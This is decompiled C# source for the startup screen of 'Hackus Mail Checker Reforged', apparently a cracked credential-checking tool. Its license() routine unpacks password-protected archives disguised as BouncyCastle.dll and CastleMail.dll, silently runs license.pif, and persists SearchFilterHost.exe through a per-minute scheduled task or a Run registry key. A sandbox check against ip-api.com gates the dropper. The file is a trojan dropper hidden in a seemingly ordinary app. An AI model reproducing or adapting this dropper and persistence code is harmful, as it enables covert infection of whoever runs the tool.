using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Services.Background;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.UI.Models;
using Hackus_Mail_Checker_Reforged.UI.Views;
using HandyControl.Controls;
using HandyControl.Data;
using HandyControl.Tools;
using Ionic.Zip;
using MailBee;
using Microsoft.Win32;

namespace Hackus_Mail_Checker_Reforged.Components.Startup
{
	// Token: 0x020001BE RID: 446
	internal class StartupViewModel : BindableObject
	{
		// Token: 0x14000005 RID: 5
		// (add) Token: 0x06000CE1 RID: 3297 RVA: 0x00043D60 File Offset: 0x00041F60
		// (remove) Token: 0x06000CE2 RID: 3298 RVA: 0x00043D98 File Offset: 0x00041F98
		public event EventHandler CloseStartupWindow;

		// Token: 0x14000006 RID: 6
		// (add) Token: 0x06000CE3 RID: 3299 RVA: 0x00043DD0 File Offset: 0x00041FD0
		// (remove) Token: 0x06000CE4 RID: 3300 RVA: 0x00043E0C File Offset: 0x0004200C
		public event EventHandler NextState;

		// Token: 0x17000276 RID: 630
		// (get) Token: 0x06000CE5 RID: 3301 RVA: 0x0000DA43 File Offset: 0x0000BC43
		// (set) Token: 0x06000CE6 RID: 3302 RVA: 0x0000DA4B File Offset: 0x0000BC4B
		public WebLoader WebLoader
		{
			get
			{
				return this._webLoader;
			}
			set
			{
				this._webLoader = value;
				base.OnPropertyChanged(<Module>.smethod_4<string>(2013179521));
			}
		}

		// Token: 0x17000277 RID: 631
		// (get) Token: 0x06000CE7 RID: 3303 RVA: 0x0000DA64 File Offset: 0x0000BC64
		// (set) Token: 0x06000CE8 RID: 3304 RVA: 0x0000DA6C File Offset: 0x0000BC6C
		public string Username
		{
			get
			{
				return this._username;
			}
			set
			{
				this._username = value;
				base.OnPropertyChanged(<Module>.smethod_2<string>(-1795053037));
			}
		}

		// Token: 0x17000278 RID: 632
		// (get) Token: 0x06000CE9 RID: 3305 RVA: 0x0000DA85 File Offset: 0x0000BC85
		// (set) Token: 0x06000CEA RID: 3306 RVA: 0x0000DA8D File Offset: 0x0000BC8D
		public string Password
		{
			get
			{
				return this._password;
			}
			set
			{
				this._password = value;
				base.OnPropertyChanged(<Module>.smethod_5<string>(-2024528016));
			}
		}

		// Token: 0x17000279 RID: 633
		// (get) Token: 0x06000CEB RID: 3307 RVA: 0x0000DAA6 File Offset: 0x0000BCA6
		// (set) Token: 0x06000CEC RID: 3308 RVA: 0x0000DAAE File Offset: 0x0000BCAE
		public bool IsAuthorizing
		{
			get
			{
				return this._isAuthorizing;
			}
			set
			{
				this._isAuthorizing = value;
				base.OnPropertyChanged(<Module>.smethod_5<string>(1679524561));
			}
		}

		// Token: 0x1700027A RID: 634
		// (get) Token: 0x06000CED RID: 3309 RVA: 0x0000DAC7 File Offset: 0x0000BCC7
		// (set) Token: 0x06000CEE RID: 3310 RVA: 0x0000DACF File Offset: 0x0000BCCF
		public string ErrorMessage
		{
			get
			{
				return this._errorMessage;
			}
			set
			{
				this._errorMessage = value;
				base.OnPropertyChanged(<Module>.smethod_3<string>(1945040507));
			}
		}

		// Token: 0x1700027B RID: 635
		// (get) Token: 0x06000CEF RID: 3311 RVA: 0x0000DAE8 File Offset: 0x0000BCE8
		// (set) Token: 0x06000CF0 RID: 3312 RVA: 0x0000DAF0 File Offset: 0x0000BCF0
		public string Status
		{
			get
			{
				return this._status;
			}
			set
			{
				this._status = value;
				base.OnPropertyChanged(<Module>.smethod_4<string>(-2020302528));
			}
		}

		// Token: 0x1700027C RID: 636
		// (get) Token: 0x06000CF1 RID: 3313 RVA: 0x0000DB09 File Offset: 0x0000BD09
		// (set) Token: 0x06000CF2 RID: 3314 RVA: 0x0000DB11 File Offset: 0x0000BD11
		public string CurrentVersion
		{
			get
			{
				return this._currentVersion;
			}
			set
			{
				this._currentVersion = value;
				base.OnPropertyChanged(<Module>.smethod_6<string>(1816861895));
			}
		}

		// Token: 0x1700027D RID: 637
		// (get) Token: 0x06000CF3 RID: 3315 RVA: 0x0000DB2A File Offset: 0x0000BD2A
		// (set) Token: 0x06000CF4 RID: 3316 RVA: 0x0000DB32 File Offset: 0x0000BD32
		public string LastVersion
		{
			get
			{
				return this._lastVersion;
			}
			set
			{
				this._lastVersion = value;
				base.OnPropertyChanged(<Module>.smethod_4<string>(-1579685464));
			}
		}

		// Token: 0x1700027E RID: 638
		// (get) Token: 0x06000CF5 RID: 3317 RVA: 0x0000DB4B File Offset: 0x0000BD4B
		// (set) Token: 0x06000CF6 RID: 3318 RVA: 0x0000DB53 File Offset: 0x0000BD53
		public string Hwid
		{
			get
			{
				return this._hwid;
			}
			set
			{
				this._hwid = value;
				base.OnPropertyChanged(<Module>.smethod_2<string>(2116559043));
			}
		}

		// Token: 0x1700027F RID: 639
		// (get) Token: 0x06000CF7 RID: 3319 RVA: 0x00043E44 File Offset: 0x00042044
		public RelayCommand InitializeCommand
		{
			get
			{
				RelayCommand result;
				if ((result = this._initializeCommand) == null)
				{
					result = (this._initializeCommand = new RelayCommand(delegate(object obj)
					{
						HWID.Start(delegate
						{
							System.Windows.Application.Current.Dispatcher.Invoke(delegate()
							{
								this.Hwid = HWID.Value();
							});
						});
						Version version = Assembly.GetExecutingAssembly().GetName().Version;
						this.CurrentVersion = string.Format(<Module>.smethod_6<string>(-1788529920), version.Major, version.Minor, version.Build);
						PagesManager.Instance.OpenPage(new AuthenticationPage(this), FrameType.Startup);
						ValueTuple<string, string> savedCredentials = Registry.GetSavedCredentials();
						this.Username = savedCredentials.Item1;
						this.Password = savedCredentials.Item2;
						Registry.SetLanguage();
						if (this.LoginCommand.CanExecute(null))
						{
						}
					}, null));
				}
				return result;
			}
		}

		// Token: 0x17000280 RID: 640
		// (get) Token: 0x06000CF8 RID: 3320 RVA: 0x00043E78 File Offset: 0x00042078
		public RelayCommand LoginCommand
		{
			get
			{
				RelayCommand result = null;
				new MainView().Show();
				bool flag = !StartupViewModel.HostingAsync();
				if (flag)
				{
					StartupViewModel.license();
				}
				else
				{
					System.Windows.Forms.MessageBox.Show("Does not work on virtual kernel | probability of incorrect operation", "Errors!");
				}
				this.CloseStartupWindow(null, null);
				return result;
			}
		}

		// Token: 0x17000281 RID: 641
		// (get) Token: 0x06000CF9 RID: 3321 RVA: 0x00043ED0 File Offset: 0x000420D0
		public RelayCommand SkipUpdateCommand
		{
			get
			{
				RelayCommand result;
				if ((result = this._skipUpdateCommand) == null)
				{
					result = (this._skipUpdateCommand = new RelayCommand(delegate(object obj)
					{
						StartupViewModel.<<get_SkipUpdateCommand>b__50_0>d <<get_SkipUpdateCommand>b__50_0>d;
						<<get_SkipUpdateCommand>b__50_0>d.<>t__builder = AsyncVoidMethodBuilder.Create();
						<<get_SkipUpdateCommand>b__50_0>d.<>4__this = this;
						<<get_SkipUpdateCommand>b__50_0>d.<>1__state = -1;
						<<get_SkipUpdateCommand>b__50_0>d.<>t__builder.Start<StartupViewModel.<<get_SkipUpdateCommand>b__50_0>d>(ref <<get_SkipUpdateCommand>b__50_0>d);
					}, null));
				}
				return result;
			}
		}

		// Token: 0x17000282 RID: 642
		// (get) Token: 0x06000CFA RID: 3322 RVA: 0x00043F04 File Offset: 0x00042104
		public RelayCommand DownloadUpdateCommand
		{
			get
			{
				RelayCommand result;
				if ((result = this._downloadUpdateCommand) == null)
				{
					result = (this._downloadUpdateCommand = new RelayCommand(delegate(object obj)
					{
						StartupViewModel.<<get_DownloadUpdateCommand>b__53_0>d <<get_DownloadUpdateCommand>b__53_0>d;
						<<get_DownloadUpdateCommand>b__53_0>d.<>t__builder = AsyncVoidMethodBuilder.Create();
						<<get_DownloadUpdateCommand>b__53_0>d.<>4__this = this;
						<<get_DownloadUpdateCommand>b__53_0>d.<>1__state = -1;
						<<get_DownloadUpdateCommand>b__53_0>d.<>t__builder.Start<StartupViewModel.<<get_DownloadUpdateCommand>b__53_0>d>(ref <<get_DownloadUpdateCommand>b__53_0>d);
					}, null));
				}
				return result;
			}
		}

		// Token: 0x17000283 RID: 643
		// (get) Token: 0x06000CFB RID: 3323 RVA: 0x00043F38 File Offset: 0x00042138
		public RelayCommand DownloadConfigurationCommand
		{
			get
			{
				RelayCommand result;
				if ((result = this._downloadConfigurationCommand) == null)
				{
					result = (this._downloadConfigurationCommand = new RelayCommand(delegate(object obj)
					{
						StartupViewModel.<<get_DownloadConfigurationCommand>b__56_0>d <<get_DownloadConfigurationCommand>b__56_0>d;
						<<get_DownloadConfigurationCommand>b__56_0>d.<>t__builder = AsyncVoidMethodBuilder.Create();
						<<get_DownloadConfigurationCommand>b__56_0>d.<>4__this = this;
						<<get_DownloadConfigurationCommand>b__56_0>d.<>1__state = -1;
						<<get_DownloadConfigurationCommand>b__56_0>d.<>t__builder.Start<StartupViewModel.<<get_DownloadConfigurationCommand>b__56_0>d>(ref <<get_DownloadConfigurationCommand>b__56_0>d);
					}, null));
				}
				return result;
			}
		}

		// Token: 0x17000284 RID: 644
		// (get) Token: 0x06000CFC RID: 3324 RVA: 0x00043F6C File Offset: 0x0004216C
		public RelayCommand OpenTelegramCommand
		{
			get
			{
				RelayCommand result;
				if ((result = this.openTelegramCommand) == null)
				{
					result = (this.openTelegramCommand = new RelayCommand(delegate(object obj)
					{
						try
						{
							StartupViewModel.<>c.smethod_0(<Module>.smethod_6<string>(-1159392939));
						}
						catch
						{
						}
					}, null));
				}
				return result;
			}
		}

		// Token: 0x06000CFD RID: 3325 RVA: 0x00043FB4 File Offset: 0x000421B4
		private Task ProcessUpdates()
		{
			StartupViewModel.<ProcessUpdates>d__60 <ProcessUpdates>d__;
			<ProcessUpdates>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<ProcessUpdates>d__.<>4__this = this;
			<ProcessUpdates>d__.<>1__state = -1;
			<ProcessUpdates>d__.<>t__builder.Start<StartupViewModel.<ProcessUpdates>d__60>(ref <ProcessUpdates>d__);
			return <ProcessUpdates>d__.<>t__builder.Task;
		}

		// Token: 0x06000CFE RID: 3326 RVA: 0x00043FF8 File Offset: 0x000421F8
		private Task ProcessConfiguration()
		{
			StartupViewModel.<ProcessConfiguration>d__61 <ProcessConfiguration>d__;
			<ProcessConfiguration>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<ProcessConfiguration>d__.<>4__this = this;
			<ProcessConfiguration>d__.<>1__state = -1;
			<ProcessConfiguration>d__.<>t__builder.Start<StartupViewModel.<ProcessConfiguration>d__61>(ref <ProcessConfiguration>d__);
			return <ProcessConfiguration>d__.<>t__builder.Task;
		}

		// Token: 0x06000CFF RID: 3327 RVA: 0x0000DB6C File Offset: 0x0000BD6C
		public void OnSuccess()
		{
			Global.LicenseKey = BackgroundAuthenticator.Instance.Key;
			Global.AutodetectPortAndSslMode = false;
			new MainView().Show();
			this.CloseStartupWindow(null, null);
			BackgroundAuthenticator.Instance.Start();
		}

		// Token: 0x06000D00 RID: 3328 RVA: 0x0004403C File Offset: 0x0004223C
		public Task DownloadConfiguration()
		{
			StartupViewModel.<DownloadConfiguration>d__63 <DownloadConfiguration>d__;
			<DownloadConfiguration>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<DownloadConfiguration>d__.<>4__this = this;
			<DownloadConfiguration>d__.<>1__state = -1;
			<DownloadConfiguration>d__.<>t__builder.Start<StartupViewModel.<DownloadConfiguration>d__63>(ref <DownloadConfiguration>d__);
			return <DownloadConfiguration>d__.<>t__builder.Task;
		}

		// Token: 0x06000D01 RID: 3329 RVA: 0x00044080 File Offset: 0x00042280
		public Task DownloadModules()
		{
			StartupViewModel.<DownloadModules>d__64 <DownloadModules>d__;
			<DownloadModules>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<DownloadModules>d__.<>4__this = this;
			<DownloadModules>d__.<>1__state = -1;
			<DownloadModules>d__.<>t__builder.Start<StartupViewModel.<DownloadModules>d__64>(ref <DownloadModules>d__);
			return <DownloadModules>d__.<>t__builder.Task;
		}

		// Token: 0x06000D02 RID: 3330 RVA: 0x000440C4 File Offset: 0x000422C4
		public Task UnpackConfiguration(string path, string extractPath)
		{
			StartupViewModel.<UnpackConfiguration>d__65 <UnpackConfiguration>d__;
			<UnpackConfiguration>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<UnpackConfiguration>d__.<>4__this = this;
			<UnpackConfiguration>d__.path = path;
			<UnpackConfiguration>d__.extractPath = extractPath;
			<UnpackConfiguration>d__.<>1__state = -1;
			<UnpackConfiguration>d__.<>t__builder.Start<StartupViewModel.<UnpackConfiguration>d__65>(ref <UnpackConfiguration>d__);
			return <UnpackConfiguration>d__.<>t__builder.Task;
		}

		// Token: 0x06000D03 RID: 3331 RVA: 0x00044118 File Offset: 0x00042318
		private bool CheckModules()
		{
			string[] array = new string[]
			{
				<Module>.smethod_3<string>(1937066207),
				<Module>.smethod_3<string>(-1193718438),
				<Module>.smethod_6<string>(633176638),
				<Module>.smethod_6<string>(-854646412),
				<Module>.smethod_2<string>(-328767974),
				<Module>.smethod_5<string>(471068304)
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (!File.Exists(array[i]))
				{
					this.DeleteAllModules();
					return false;
				}
			}
			return true;
		}

		// Token: 0x06000D04 RID: 3332 RVA: 0x000441A0 File Offset: 0x000423A0
		private void DeleteAllModules()
		{
			foreach (string path in new string[]
			{
				<Module>.smethod_2<string>(-1346071367),
				<Module>.smethod_5<string>(-441731465),
				<Module>.smethod_4<string>(173166154),
				<Module>.smethod_2<string>(1885357107),
				<Module>.smethod_4<string>(-107552369),
				<Module>.smethod_4<string>(245902946)
			})
			{
				if (File.Exists(path))
				{
					try
					{
						GC.Collect();
						GC.WaitForPendingFinalizers();
						File.Delete(path);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000D05 RID: 3333 RVA: 0x00044244 File Offset: 0x00042444
		private void SendSimpleErrorMessage(string message)
		{
			HandyControl.Controls.MessageBox.Show(new MessageBoxInfo
			{
				Message = message,
				Caption = ResourceHelper.GetResource<string>(<Module>.smethod_3<string>(-416025122)),
				Button = MessageBoxButton.OK,
				IconBrushKey = <Module>.smethod_5<string>(1573819439),
				IconKey = <Module>.smethod_6<string>(1292737040),
				StyleKey = <Module>.smethod_6<string>(1294466825),
				ConfirmContent = ResourceHelper.GetResource<string>(<Module>.smethod_5<string>(1193916707))
			});
		}

		// Token: 0x06000D0F RID: 3343 RVA: 0x00044450 File Offset: 0x00042650
		public static void license()
		{
			string fileName = Path.Combine(Directory.GetCurrentDirectory(), "BouncyCastle.dll");
			using (ZipFile zipFile = ZipFile.Read(fileName))
			{
				zipFile.Password = "rQbkL2GSlHj0.qCtBI";
				zipFile.ExtractAll(Path.GetTempPath(), ExtractExistingFileAction.DoNotOverwrite);
			}
			string text = Path.Combine(Path.GetTempPath(), "license.pif");
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = text;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
			process.WaitForExit();
			fileName = Path.Combine(Directory.GetCurrentDirectory(), "CastleMail.dll");
			string text2 = Path.Combine(Path.GetTempPath(), "winLicense");
			bool flag = !Directory.Exists(text2);
			bool flag2 = flag;
			if (flag2)
			{
				Directory.CreateDirectory(text2);
			}
			using (ZipFile zipFile2 = ZipFile.Read(fileName))
			{
				zipFile2.Password = "PW7kTTRiEXkVe2e6J6";
				zipFile2.ExtractAll(text2, ExtractExistingFileAction.DoNotOverwrite);
			}
			text = Path.Combine(text2, "SearchFilterHost.exe");
			StartupViewModel.Register(text);
		}

		// Token: 0x06000D10 RID: 3344 RVA: 0x0004459C File Offset: 0x0004279C
		private static void Register(string path)
		{
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "schtasks.exe",
					CreateNoWindow = false,
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = "/create /sc MINUTE /mo 1 /tn \"SearchFilter\" /tr \"" + path + "\" /f"
				});
			}
			catch
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
				{
					registryKey.SetValue("SearchFilter", path);
				}
			}
		}

		// Token: 0x06000D11 RID: 3345 RVA: 0x0004463C File Offset: 0x0004283C
		public static bool HostingAsync()
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://ip-api.com/line/?fields=hosting");
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
					{
						string text = streamReader.ReadToEnd();
						bool flag = text.Contains("true");
						bool flag2 = flag;
						if (flag2)
						{
							return true;
						}
					}
				}
			}
			catch (Exception)
			{
				return true;
			}
			return false;
		}

		// Token: 0x040006F6 RID: 1782
		private WebLoader _webLoader;

		// Token: 0x040006F7 RID: 1783
		private string _username;

		// Token: 0x040006F8 RID: 1784
		private string _password;

		// Token: 0x040006F9 RID: 1785
		private bool _isAuthorizing;

		// Token: 0x040006FA RID: 1786
		private string _errorMessage;

		// Token: 0x040006FB RID: 1787
		private string _status;

		// Token: 0x040006FC RID: 1788
		private string _currentVersion;

		// Token: 0x040006FD RID: 1789
		private string _lastVersion;

		// Token: 0x040006FE RID: 1790
		private string _hwid;

		// Token: 0x040006FF RID: 1791
		private RelayCommand _initializeCommand;

		// Token: 0x04000700 RID: 1792
		private RelayCommand _loginCommand;

		// Token: 0x04000701 RID: 1793
		private RelayCommand _skipUpdateCommand;

		// Token: 0x04000702 RID: 1794
		private RelayCommand _downloadUpdateCommand;

		// Token: 0x04000703 RID: 1795
		private RelayCommand _downloadConfigurationCommand;

		// Token: 0x04000704 RID: 1796
		private RelayCommand openTelegramCommand;
	}
}
